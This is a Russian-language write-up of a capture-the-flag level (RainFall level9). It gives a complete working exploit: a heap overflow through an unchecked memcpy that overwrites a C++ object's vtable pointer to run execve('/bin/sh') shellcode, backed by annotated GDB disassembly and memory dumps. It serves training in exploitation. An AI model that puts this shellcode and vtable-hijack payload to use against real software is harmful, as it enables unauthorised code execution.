#Решение
python -c "print '\x10\xa0\x04\x08' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'A'*76 + '\x0c\xa0\04\x08'" > /tmp/lvl9
./level9 `cat /tmp/lvl9`
cd ../bonus0
cat .pass

#Объяснение

1. Анализируем поведение программы
level9@RainFall:~$ ./level9
level9@RainFall:~$ ./level9 A
level9@RainFall:~$ ./level9 A V
level9@RainFall:~$ ./level9 A V V

Независимо от аргументов ничего не делает.

2. ltrace
level9@RainFall:~$ ltrace ./level9
__libc_start_main(0x80485f4, 1, 0xbffff6f4, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330) = 0
_exit(1 <unfinished ...>
+++ exited (status 1) +++

Ничего не понятно.

3. GDB

(gdb) disas main

   0x080485f4 <+0>:	    push   %ebp                 // пролог
   0x080485f5 <+1>:	    mov    %esp,%ebp
   0x080485f7 <+3>:	    push   %ebx                 // кладем значение регистра EBX в стек
   0x080485f8 <+4>:	    and    $0xfffffff0,%esp     // указываем вершину стека
   0x080485fb <+7>:	    sub    $0x20,%esp           // выделяем 32 байта на стеке
   0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp)       // сравниваем 1 со значением argc. (<)
   0x08048602 <+14>:	jg     0x8048610 <main+28>  // перепрыгиваем на строку, если второй операнд больше первого операнда

   0x08048604 <+16>:	movl   $0x1,(%esp)          // кладем 1 на вершину стека
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>    // выполняем _exit(1)

   0x08048610 <+28>:	movl   $0x6c,(%esp)         // кладем 108 на вершину стека
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>    // Вызов вункции new для создания объекта (!c++filt _Znwj)
   0x0804861c <+40>:	mov    %eax,%ebx            // адрес на новый объект кладем в регистр EBX
   0x0804861e <+42>:	movl   $0x5,0x4(%esp)       // кладем число 5 на стек (2 аргумент)
   0x08048626 <+50>:	mov    %ebx,(%esp)          // кладем адрес 1-го объекта на стек (1 аргумент)
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>    // вызываем метод N::N(int) - конструктор. Кладем в один из атрибутов объекта 5.
   0x0804862e <+58>:	mov    %ebx,0x1c(%esp)      // кладем адрес 1го объекта в стек
   0x08048632 <+62>:	movl   $0x6c,(%esp)         // кладем 108 на вершину стека
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt> // Вызов вункции new для создания объекта (!c++filt _Znwj)
   0x0804863e <+74>:	mov    %eax,%ebx            // адрес на новый объект кладем в регистр EBX
   0x08048640 <+76>:	movl   $0x6,0x4(%esp)       // кладем значение 6 на стек (2 аргумент)
   0x08048648 <+84>:	mov    %ebx,(%esp)          // кладем адрес 2го объекта на стек (1 аргумент)
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei> // вызываем метод N::N(int) - конструктор. Кладем в один из атрибутов объекта 6.
   0x08048650 <+92>:	mov    %ebx,0x18(%esp)      // кладем адрес 2го объекта на стек
   0x08048654 <+96>:	mov    0x1c(%esp),%eax      // адрес 1го объекта кладем в EAX
   0x08048658 <+100>:	mov    %eax,0x14(%esp)      // адрес 1го объекта кладем в стек
   0x0804865c <+104>:	mov    0x18(%esp),%eax      // адрес 2го объекта кладем в EAX
   0x08048660 <+108>:	mov    %eax,0x10(%esp)      // адрес второго объекта кладем на стек
   0x08048664 <+112>:	mov    0xc(%ebp),%eax       // адрес argv кладем в EAX
   0x08048667 <+115>:	add    $0x4,%eax            // кладем в EAX адрес, указывающий на argv[1]
   0x0804866a <+118>:	mov    (%eax),%eax          // кладем адрес argv[1] в EAX
   0x0804866c <+120>:	mov    %eax,0x4(%esp)       // помещаем адрес argv[1] на стек (2 аргумент)
   0x08048670 <+124>:	mov    0x14(%esp),%eax      // адрес 1го объекта кладем в EAX
   0x08048674 <+128>:	mov    %eax,(%esp)          // адрес 1го объекта кладем на вершину стека (1 аргумент)
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc> // вызываем метод N::setAnnotation(char*) для 1го объекта с аргументом argv[1]
   0x0804867c <+136>:	mov    0x10(%esp),%eax      // адрес, в котором лежит адрес 2го объекта кладем в регистр EAX
   0x08048680 <+140>:	mov    (%eax),%eax          // кладем адрес 2го объекта в EAX
   0x08048682 <+142>:	mov    (%eax),%edx          // кладем адрес второго объекта в EDX
   0x08048684 <+144>:	mov    0x14(%esp),%eax      // адрес 1го объекта кладем в EAX
   0x08048688 <+148>:	mov    %eax,0x4(%esp)       // адрес 1го объекта помещаем на стек (2 аргумент)
   0x0804868c <+152>:	mov    0x10(%esp),%eax      // кладем адрес второго объекта в EAX
   0x08048690 <+156>:	mov    %eax,(%esp)          // кладем адрес второго объекта на стек (аргумент)
   0x08048693 <+159>:	call   *%edx                // вызываем метод 2го объекта через разыменование таблицы виртуальных функций с аргументом - 2м объектом
   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx      // кладем результат вычислений в EBX
   0x08048698 <+164>:	leave
   0x08048699 <+165>:	ret

В функции main создается два объекта. В первый из них как атрибут кладется 5, во второй - 4.
Затем для первого объекта вызывается метод setAnnotation, где во второй атрибут объекта копируется argv[1].
После происходит вызов метода второго объекта с переопределенной операцией +, где первый объект будет аргументом.

(gdb) disas 0x80486f6   // <_ZN1NC2Ei> N::N(int) - конструктор
   0x080486f6 <+0>:	    push   %ebp                 // пролог
   0x080486f7 <+1>:	    mov    %esp,%ebp
   0x080486f9 <+3>:	    mov    0x8(%ebp),%eax       // берем аргумент из стека. Адрес на один из объектов. (1 арг)
   0x080486fc <+6>:	    movl   $0x8048848,(%eax)    // кладем таблицу виртуальных функций в начало объекта
   0x08048702 <+12>:	mov    0x8(%ebp),%eax       // берем аргумент из стека в EAX. Адрес на один из объектов.
   0x08048705 <+15>:	mov    0xc(%ebp),%edx       // берем из стека число и помещаем в EDX. в данном коде 5 или 6. (2 арг)
   0x08048708 <+18>:	mov    %edx,0x68(%eax)      // кладем число в объект со смещением +104 байта
   0x0804870b <+21>:	pop    %ebp                 // убираем EBP из стека
   0x0804870c <+22>:	ret

(gdb) disas 0x0804870e  // N::setAnnotation(char*) - метод объекта
   0x0804870e <+0>:	    push   %ebp                 // пролог
   0x0804870f <+1>:	    mov    %esp,%ebp
   0x08048711 <+3>:	    sub    $0x18,%esp           // выделяем 24 байта на стеке
   0x08048714 <+6>:	    mov    0xc(%ebp),%eax       // берем адрес второго аргумента метода - argv[1]
   0x08048717 <+9>:	    mov    %eax,(%esp)          // кладем  адрес в стек
   0x0804871a <+12>:	call   0x8048520 <strlen@plt>   // вычисляем длину argv[1]
   0x0804871f <+17>:	mov    0x8(%ebp),%edx       // берем адрес объекта (1 аргумент) и кладем в EDX
   0x08048722 <+20>:	add    $0x4,%edx            // смещаем указатель объекта на 4 байта
   0x08048725 <+23>:	mov    %eax,0x8(%esp)       // длину argv[1] помещаем на стек (3 аргумент)
   0x08048729 <+27>:	mov    0xc(%ebp),%eax       // берем адрес argv[1] в EAX
   0x0804872c <+30>:	mov    %eax,0x4(%esp)       // помещаем адрес argv[1] на стек (2 аргумент)
   0x08048730 <+34>:	mov    %edx,(%esp)          // кладем адрес объекта+4 на стек (1 аргумент)
   0x08048733 <+37>:	call   0x8048510 <memcpy@plt> // вызываем функцию memcpy с тремя аргументами.
   0x08048738 <+42>:	leave
   0x08048739 <+43>:	ret

В методе setAnnotation используется небезопасная функция memcpy для копирования памяти из argv[1] во второй атрибут объекта.
Происходит копирование памяти в размере входящего аргумента.

4. Взлом

- Посмотрим, как выглядит объект в памяти.

память первого объекта, после того, как мы его создали и поместили в атрибуты 5 и "AAAA".

            ссылка на таблицу виртуальных функций
                |        "AAAA" - скопированная строка из argv[1]. атрибут.
                |           |
0x804a008:	0x08048848	0x41414141	0x00000000	0x00000000
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000005
                                        |
                                       5. Атрибут. Число, переданное в конструкторе.

- Первый объект лежит по адресу 0x804a008, второй - 0x804a078.

(gdb) x/56wx 0x804a008
                                                                     0x804a00c - адрес начала атрибута annotation
                                                                         |
                                            0x804a008:	0x08048848	0x41414141	0x00000000	0x00000000 - 1ый объект
                                            0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
                                            0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
                                            0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
                                            0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
                                            0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
                                            0x804a068:	0x00000000	0x00000000	0x00000005	0x00000071
адрес таблицы вирт функций 2го объекта -    0x804a078:	0x08048848	0x00000000	0x00000000	0x00000000 -2ой объект
                                            0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
                                            0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
                                            0x804a0a8:	0x00000000	0x00000000	0x00000000	0x00000000
                                            0x804a0b8:	0x00000000	0x00000000	0x00000000	0x00000000
                                            0x804a0c8:	0x00000000	0x00000000	0x00000000	0x00000000
                                            0x804a0d8:	0x00000000	0x00000000	0x00000006	0x00020f21


 - Обратимся к строке из main.
   0x08048693 <+159>:	call   *%edx
Тут происходит разыменование таблицы виртуальных функций, которая лежит в начале второго объекта, затем вызов.
Мы можем это воспринимать, как двойное разыменование.

Так как в программе нет вызовов bash, cat и тд. У нас остается один выход (из известных мне на данный момент),
передать шеллкод с запуском bash.

Мы можем перезаписать через незащищенную функцию memcpy адрес таблицы виртуальных функций 2го объекта.
Однако, у нас есть еще второй разыменование. Поэтому вместо адреса таблицы виртуальных функций мы укажем
адрес первой ячейки памяти атрибута annotation первого объекта, а в эту ячейку положим адрес второй, где будет
начинаться шеллкод.
Все не так страшно, как звучит)

Протестируем сначала на "A".
(gdb)!python -c "print 'A'*111" > /tmp/test
(gdb) x/56wx 0x804a008
0x804a008:	0x08048848	0x41414141	0x41414141	0x41414141
0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a028:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a038:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a048:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a058:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a068:	0x41414141	0x41414141	0x41414141	0x41414141
0x804a078:	0x41414141	0x00000000	0x00000000	0x00000000
0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0d8:	0x00000000	0x00000000	0x00000006	0x00020f21

Нам надо переписать 111 байт, чтобы затереть адрес таблицы функций во втором объекте.

Подготовим эксплойт:
    адрес 8ой ячейки атрибута annotation шеллкод                                                                                                          заполнитель    адрес 1ой ячейки annotation
                            |                                   |                                                                                             |           |
python -c "print '\x10\xa0\x04\x08' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'A'*76 + '\x0c\xa0\04\x08'" > /tmp/lvl9

Осталось запустить и наслаждаться результатом.